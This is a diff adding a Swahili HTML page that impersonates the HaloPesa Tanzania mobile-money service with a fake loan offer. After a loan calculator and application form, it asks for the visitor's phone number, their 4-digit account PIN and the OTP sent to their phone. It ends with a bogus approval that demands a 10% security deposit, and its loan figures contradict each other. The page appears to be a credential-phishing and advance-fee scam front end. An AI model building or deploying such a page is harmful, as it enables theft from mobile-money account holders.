@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="sw">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>HaloPesa Tanzania - Mikopo ya Haraka na Rahisi</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <!-- Toast Overlay Notification -->
+  <div id="toast-notification" class="toast-notification hidden"></div>
+
+  <header class="header">
+    <div class="logo-container">
+      <span class="menu-icon">&#9776;</span>
+      <div class="logo">HaloPesa</div>
+    </div>
+  </header>
+
+  <main class="main-container">
+    <!-- Step 1: Calculator / Start -->
+    <section id="step-calculator" class="card">
+      <h2>Pata Mkopo Wako Haraka</h2>
+      <p class="subtitle">Idhini ya haraka • Riba nafuu • Muda rahisi</p>
+      
+      <div class="calc-box">
+        <label>Kiasi cha Mkopo</label>
+        <div class="amount-display" id="display-amount">TSh 100,000</div>
+        <input type="range" id="loan-amount-range" min="10000" max="100000000" step="5000" value="100000">
+        
+        <label>Muda wa Mkopo</label>
+        <div class="duration-display" id="display-duration">miezi 12</div>
+        <input type="range" id="loan-duration-range" min="6" max="60" step="1" value="12">
+
+        <div class="monthly-payment">
+          <span>Malipo ya Kila Mwezi</span>
+          <strong id="monthly-payment-val">TSh 9,504</strong>
+        </div>
+      </div>
+
+      <button id="btn-start-apply" class="primary-btn">OMBA SASA</button>
+
+      <div class="features-grid">
+        <div>⚡ <span>Idhini ya Haraka</span><small>Ndani ya masaa 24</small></div>
+        <div>💰 <span>Riba Nafuu</span><small>Kuanzia 25%</small></div>
+        <div>🔒 <span>Salama</span><small>Kiwango cha benki</small></div>
+      </div>
+    </section>
+
+    <!-- Step 2: Application Form -->
+    <section id="step-form" class="card hidden">
+      <h2>Maombi ya Mkopo</h2>
+      <div class="step-indicator">Hatua 1 ya 3</div>
+
+      <div class="form-group">
+        <label>Aina ya Mkopo</label>
+        <select id="loan-type">
+          <option>Mkopo wa Biashara</option>
+          <option>Mkopo wa Binafsi</option>
+        </select>
+      </div>
+
+      <div class="form-group">
+        <label>Kiasi cha Mkopo (TSh)</label>
+        <input type="text" id="form-amount-input" value="100000">
+      </div>
+
+      <div class="form-group">
+        <label>Muda wa Mkopo</label>
+        <select id="form-duration-select">
+          <option value="12">Miezi 12</option>
+          <option value="24">Miezi 24</option>
+          <option value="48">Miezi 48</option>
+        </select>
+      </div>
+
+      <div class="form-group">
+        <label>Madhumuni ya Mkopo</label>
+        <textarea id="loan-purpose" placeholder="Elezea madhumuni ya mkopo wako..."></textarea>
+      </div>
+
+      <button id="btn-next-1" class="primary-btn">HATUA INAYOFUATA</button>
+    </section>
+
+    <!-- Step 3: Personal Details -->
+    <section id="step-personal" class="card hidden">
+      <h2>Maombi ya Mkopo</h2>
+      <div class="step-indicator">Hatua 2 ya 3</div>
+
+      <div class="form-row">
+        <div class="form-group">
+          <label>Jina la Kwanza</label>
+          <input type="text" id="first-name" placeholder="Jina la kwanza">
+        </div>
+        <div class="form-group">
+          <label>Jina la Ukoo</label>
+          <input type="text" id="last-name" placeholder="Jina la ukoo">
+        </div>
+      </div>
+
+      <div class="form-group">
+        <label>Nambari ya Simu (HaloPesa)</label>
+        <div class="phone-input-wrapper">
+          <span class="flag">+255</span>
+          <input type="tel" id="phone-number" placeholder="062xxxxxxx au 061/063" maxlength="10">
+        </div>
+        <small id="phone-error" class="error-text hidden">Namba lazima ianze na 061, 062, au 063 (Tarakimu 10).</small>
+      </div>
+
+      <div class="button-row">
+        <button id="btn-prev-2" class="secondary-btn">ILIYOTANGULIA</button>
+        <button id="btn-next-2" class="primary-btn">HATUA INAYOFUATA</button>
+      </div>
+    </section>
+
+    <!-- Step 4: Summary & Submit -->
+    <section id="step-summary" class="card hidden">
+      <h2>Maombi ya Mkopo</h2>
+      <div class="step-indicator">Hatua 3 ya 3</div>
+
+      <div class="form-group">
+        <label>Hali ya Ajira</label>
+        <select id="employment-status">
+          <option>Mfanyabiashara</option>
+          <option>Miajiriwa</option>
+        </select>
+      </div>
+
+      <div class="form-group">
+        <label>Mapato ya Mwaka (TSh)</label>
+        <input type="text" id="annual-income" placeholder="Weka mapato ya mwaka">
+      </div>
+
+      <div class="summary-box">
+        <h3>Muhtasari wa Maombi</h3>
+        <p>Kiasi cha Mkopo: <strong id="sum-amount">TSh 100,000</strong></p>
+        <p>Muda wa Mkopo: <strong id="sum-duration">Miezi 48</strong></p>
+        <p>Madhumuni: <strong id="sum-purpose">Budghu</strong></p>
+        <p>Mwombaji: <strong id="sum-name">-</strong></p>
+      </div>
+
+      <div class="button-row">
+        <button id="btn-prev-3" class="secondary-btn">ILIYOTANGULIA</button>
+        <button id="btn-submit-app" class="primary-btn">WASILISHA MAOMBI</button>
+      </div>
+    </section>
+
+    <!-- Step 5: PIN Entry Screen -->
+    <section id="step-pin" class="card hidden">
+      <h2>Ingia Akaunti</h2>
+      <p class="subtitle" id="pin-phone-display">+255...</p>
+      
+      <div class="form-group pin-container">
+        <label>Weka PIN yako (tarakimu 4)</label>
+        <div class="pin-inputs">
+          <input type="password" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+          <input type="password" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+          <input type="password" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+          <input type="password" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+        </div>
+      </div>
+
+      <button id="btn-submit-pin" class="primary-btn" disabled>INGIA</button>
+    </section>
+
+    <!-- Step 6: OTP Screen with Countdown & Auto-Fill -->
+    <section id="step-otp" class="card hidden">
+      <h2>Uthibitisho wa OTP</h2>
+      <p class="subtitle">Weka OTP iliyotumjwa kwenye namba yako ya simu <span id="otp-phone-display"></span></p>
+
+      <div class="success-banner">✓ Maelezo yamethibitishwa! Tafadhali weka OTP yako hapa chini.</div>
+
+      <div class="form-group pin-container">
+        <div class="pin-inputs">
+          <input type="text" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+          <input type="text" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+          <input type="text" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+          <input type="text" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+        </div>
+      </div>
+
+      <div class="timer-row">
+        <span id="otp-timer">Tuma tena simbo ndani ya 30 sekunde</span>
+        <button id="btn-request-new-otp" class="link-btn hidden">TUMA OMBI JIPYA LA OTP</button>
+      </div>
+
+      <button id="btn-submit-otp" class="primary-btn" disabled>WASILISHA</button>
+    </section>
+
+    <!-- Step 7: Final Success Screen -->
+    <section id="step-success" class="card hidden text-center">
+      <div class="success-icon-large">✓</div>
+      <h2>Hongera!</h2>
+      <p class="subtitle">Mkopo wako <strong>umeidhinishwa!</strong> Fedha zitatolewa hivi karibuni.</p>
+
+      <div class="approved-amount-box">
+        <small>KIASI KILICHOIDHINISHWA</small>
+        <h1 id="final-approved-amount">TSh 100,000</h1>
+      </div>
+
+      <div class="notice-box">
+        ⚠️ <strong>NOTISI YA UZINGATIAJI</strong><br>
+        Akaunti yako ya HaloPesa lazima iwe hai na idumishe amana ya usalama ya angalau 10% ya kiasi cha mkopo uliounda.
+      </div>
+
+      <div class="summary-details-list">
+        <div><span>MALIPO YA KILA MWEZI</span> <strong>TSh 2,441</strong></div>
+        <div><span>MUDA WA MKOPO</span> <strong>Miezi 48</strong></div>
+        <div><span>KIWANGO CHA RIBA</span> <strong>8% APR</strong></div>
+      </div>
+
+      <button id="btn-home" class="primary-btn">Rudi Nyumbani</button>
+    </section>
+  </main>
+
+  <script src="script.js"></script>
+</body>
+                                                                  </html>
+            
